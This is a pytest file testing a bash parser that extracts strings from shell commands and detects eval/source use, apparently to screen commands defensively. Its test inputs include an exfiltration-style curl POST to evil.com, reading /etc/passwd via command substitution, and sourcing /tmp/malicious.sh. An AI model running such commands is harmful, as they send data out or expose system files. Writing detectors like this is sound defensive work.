"""Tests for the bash AST parser module."""

import shutil
import subprocess

import pytest

from scripts.bash_ast import extract_strings, has_eval_or_source


# Helper to check if shfmt is available
SHFMT_AVAILABLE = shutil.which("shfmt") is not None


class TestExtractStrings:
    """Tests for extract_strings function."""

    @pytest.mark.skipif(not SHFMT_AVAILABLE, reason="shfmt not installed")
    def test_simple_echo(self):
        result = extract_strings('echo "hello world"')
        assert "hello world" in result

    @pytest.mark.skipif(not SHFMT_AVAILABLE, reason="shfmt not installed")
    def test_curl_with_data(self):
        result = extract_strings('curl -X POST http://evil.com -d "secret payload"')
        assert "secret payload" in result

    @pytest.mark.skipif(not SHFMT_AVAILABLE, reason="shfmt not installed")
    def test_pipe_chain(self):
        result = extract_strings('cat file.txt | grep "pattern"')
        assert "pattern" in result

    @pytest.mark.skipif(not SHFMT_AVAILABLE, reason="shfmt not installed")
    def test_heredoc(self):
        command = "cat <<EOF\nheredoc content here\nEOF"
        result = extract_strings(command)
        # Heredoc content should be extracted
        found = any("heredoc content here" in s for s in result)
        assert found, f"Expected heredoc content in {result}"

    @pytest.mark.skipif(not SHFMT_AVAILABLE, reason="shfmt not installed")
    def test_command_substitution(self):
        result = extract_strings("echo $(cat /etc/passwd)")
        assert "/etc/passwd" in result

    @pytest.mark.skipif(not SHFMT_AVAILABLE, reason="shfmt not installed")
    def test_empty_command(self):
        result = extract_strings("")
        assert result == []

    @pytest.mark.skipif(not SHFMT_AVAILABLE, reason="shfmt not installed")
    def test_malformed_command(self):
        # Should return a list (possibly empty), not crash
        result = extract_strings('echo "unterminated')
        assert isinstance(result, list)

    def test_shfmt_not_found(self, monkeypatch):
        monkeypatch.setenv("SHFMT_PATH", "/nonexistent/path/to/shfmt")
        result = extract_strings('echo "hello world"')
        assert result == []

    @pytest.mark.skipif(not SHFMT_AVAILABLE, reason="shfmt not installed")
    def test_single_quotes(self):
        result = extract_strings("echo 'single quoted string'")
        assert "single quoted string" in result

    @pytest.mark.skipif(not SHFMT_AVAILABLE, reason="shfmt not installed")
    def test_variable_assignment(self):
        result = extract_strings('SECRET="my_api_key_value"')
        assert "my_api_key_value" in result


class TestHasEvalOrSource:
    """Tests for has_eval_or_source function."""

    def test_eval_detected(self):
        assert has_eval_or_source('eval "$(echo payload)"') is True

    def test_source_detected(self):
        assert has_eval_or_source("source /tmp/malicious.sh") is True

    def test_dot_source_detected(self):
        assert has_eval_or_source(". /tmp/malicious.sh") is True

    def test_normal_command(self):
        assert has_eval_or_source("echo hello world") is False

    def test_eval_in_string_not_detected(self):
        assert has_eval_or_source('grep "eval" file.txt') is False

    def test_source_as_argument_not_detected(self):
        assert has_eval_or_source('echo "check the source code"') is False
